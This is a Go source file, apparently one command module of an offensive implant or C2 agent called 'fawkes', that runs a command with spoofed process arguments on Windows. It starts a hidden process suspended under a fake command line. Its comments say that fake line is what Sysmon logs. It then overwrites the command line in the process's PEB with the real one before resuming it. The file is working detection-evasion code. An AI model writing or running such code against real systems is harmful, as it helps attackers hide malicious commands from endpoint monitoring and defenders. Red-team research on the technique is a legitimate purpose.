//go:build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// ArgueCommand implements process argument spoofing
type ArgueCommand struct{}

func (c *ArgueCommand) Name() string { return "argue" }
func (c *ArgueCommand) Description() string {
	return "Execute a command with spoofed process arguments"
}

// RTL_USER_PROCESS_PARAMETERS offsets (x64)
const (
	ruppCommandLineOffset = 0x70 // CommandLine UNICODE_STRING
)

var (
	ntdllArgue                       = windows.NewLazySystemDLL("ntdll.dll")
	procNtQueryInformationProcessArg = ntdllArgue.NewProc("NtQueryInformationProcess")
	procNtResumeThread               = ntdllArgue.NewProc("NtResumeThread")
)

func (c *ArgueCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[argueParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.Command == "" {
		return errorResult("Error: command is required")
	}

	// If no spoof string provided, use just the executable name
	if params.Spoof == "" {
		exe := extractExeName(params.Command)
		params.Spoof = exe
	}

	output, err := executeSpoofedProcess(params.Command, params.Spoof)
	if err != nil {
		if output != "" {
			return errorf("%s\nError: %v", output, err)
		}
		return errorf("Error: failed to execute spoofed process for command %q: %v", params.Command, err)
	}

	trimmed := strings.TrimSpace(output)
	if trimmed == "" {
		trimmed = "Command executed successfully (no output)"
	}
	return successResult(trimmed)
}

// executeSpoofedProcess creates a process with spoofed command line args
func executeSpoofedProcess(realCmd, spoofCmd string) (string, error) {
	// Ensure the spoof command uses the same executable as the real command
	realExe := extractExeName(realCmd)
	spoofExe := extractExeName(spoofCmd)
	if !strings.EqualFold(realExe, spoofExe) {
		// Prepend the real executable to the spoof args
		spoofCmd = realExe + " " + spoofCmd
	}

	// Pad spoof command to be at least as long as the real command.
	// This ensures the real command fits in the existing PEB buffer without
	// needing to allocate new memory or change the Buffer pointer, which
	// can cause STATUS_DLL_INIT_FAILED during process initialization.
	if len(spoofCmd) < len(realCmd) {
		spoofCmd = spoofCmd + strings.Repeat(" ", len(realCmd)-len(spoofCmd))
	}

	// Create pipe for stdout/stderr capture
	var stdoutRead, stdoutWrite windows.Handle
	var sa windows.SecurityAttributes
	sa.Length = uint32(unsafe.Sizeof(sa))
	sa.InheritHandle = 1

	if err := windows.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0); err != nil {
		return "", fmt.Errorf("pipe creation: %w", err)
	}
	defer windows.CloseHandle(stdoutRead)

	// Prevent read handle from being inherited
	if err := windows.SetHandleInformation(stdoutRead, windows.HANDLE_FLAG_INHERIT, 0); err != nil {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("handle attribute set: %w", err)
	}

	// Step 1: Create process SUSPENDED with SPOOFED command line
	// This is what Sysmon Event ID 1 will log
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW
	si.ShowWindow = windows.SW_HIDE
	si.StdOutput = stdoutWrite
	si.StdErr = stdoutWrite

	var pi windows.ProcessInformation

	spoofUTF16, err := windows.UTF16PtrFromString(spoofCmd)
	if err != nil {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("invalid spoof command: %w", err)
	}

	// CREATE_SUSPENDED (0x4) | CREATE_NO_WINDOW (0x08000000)
	err = windows.CreateProcess(
		nil,
		spoofUTF16,
		nil, nil,
		true, // inherit handles for pipe
		windows.CREATE_SUSPENDED|CREATE_NO_WINDOW,
		nil, nil,
		&si, &pi,
	)
	if err != nil {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("process creation (suspended): %w", err)
	}

	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	if err := arguePatchPEB(pi.Process, realCmd); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(stdoutWrite)
		return "", err
	}

	windows.CloseHandle(stdoutWrite)
	return argueResumeAndCapture(stdoutRead, &pi)
}

// arguePatchPEB reads the PEB of a suspended process and overwrites the
// CommandLine UNICODE_STRING buffer with the real command.
func arguePatchPEB(hProcess windows.Handle, realCmd string) error {
	var pbi PROCESS_BASIC_INFORMATION
	var retLen uint32
	status, _, _ := procNtQueryInformationProcessArg.Call(
		uintptr(hProcess),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if status != 0 {
		return fmt.Errorf("process info query: status 0x%X", status)
	}

	var processParamsAddr uintptr
	if err := readProcessMemoryPtr(hProcess, pbi.PebBaseAddress+pebProcessParametersOffset, &processParamsAddr); err != nil {
		return fmt.Errorf("read process parameters: %w", err)
	}

	cmdLineAddr := processParamsAddr + ruppCommandLineOffset
	var cmdLineUS [16]byte
	var bytesRead uintptr
	if err := windows.ReadProcessMemory(hProcess, cmdLineAddr, &cmdLineUS[0], 16, &bytesRead); err != nil {
		return fmt.Errorf("read CommandLine UNICODE_STRING: %w", err)
	}

	origBuffer := *(*uintptr)(unsafe.Pointer(&cmdLineUS[8]))

	realUTF16, err := windows.UTF16FromString(realCmd)
	if err != nil {
		return fmt.Errorf("encode real command: %w", err)
	}
	realLenBytes := uint16((len(realUTF16) - 1) * 2)
	realMaxBytes := uint16(len(realUTF16) * 2)

	realBytes := make([]byte, realMaxBytes)
	for i, c := range realUTF16 {
		binary.LittleEndian.PutUint16(realBytes[i*2:], c)
	}
	var bytesWritten uintptr
	if err := windows.WriteProcessMemory(hProcess, origBuffer, &realBytes[0], uintptr(len(realBytes)), &bytesWritten); err != nil {
		return fmt.Errorf("write real command: %w", err)
	}

	var lenBuf [2]byte
	binary.LittleEndian.PutUint16(lenBuf[:], realLenBytes)
	if err := windows.WriteProcessMemory(hProcess, cmdLineAddr, &lenBuf[0], 2, &bytesWritten); err != nil {
		return fmt.Errorf("update CommandLine.Length: %w", err)
	}
	return nil
}

// argueResumeAndCapture resumes a suspended process and reads its stdout.
func argueResumeAndCapture(stdoutRead windows.Handle, pi *windows.ProcessInformation) (string, error) {
	var suspendCount uint32
	status, _, _ := procNtResumeThread.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&suspendCount)),
	)
	if status != 0 {
		windows.TerminateProcess(pi.Process, 1)
		return "", fmt.Errorf("thread resume: status 0x%X", status)
	}

	var output strings.Builder
	buf := make([]byte, 4096)
	for {
		var n uint32
		readErr := windows.ReadFile(stdoutRead, buf, &n, nil)
		if readErr != nil || n == 0 {
			break
		}
		output.Write(buf[:n])
		if output.Len() > 10*1024*1024 {
			output.WriteString("\n[output truncated at 10MB]")
			break
		}
	}

	event, _ := windows.WaitForSingleObject(pi.Process, 30000)
	if event == uint32(windows.WAIT_TIMEOUT) {
		windows.TerminateProcess(pi.Process, 1)
		return output.String(), fmt.Errorf("process timed out after 30s")
	}

	var exitCode uint32
	if err := windows.GetExitCodeProcess(pi.Process, &exitCode); err == nil && exitCode != 0 {
		return output.String(), fmt.Errorf("exit status %d", exitCode)
	}

	return output.String(), nil
}

// extractExeName extracts the executable name from a command line
func extractExeName(cmdLine string) string {
	cmdLine = strings.TrimSpace(cmdLine)
	if cmdLine == "" {
		return ""
	}

	// Handle quoted executable paths
	if cmdLine[0] == '"' {
		end := strings.Index(cmdLine[1:], "\"")
		if end >= 0 {
			return cmdLine[1 : end+1]
		}
		return cmdLine[1:]
	}

	// Unquoted — take first space-delimited token
	parts := strings.SplitN(cmdLine, " ", 2)
	return parts[0]
}
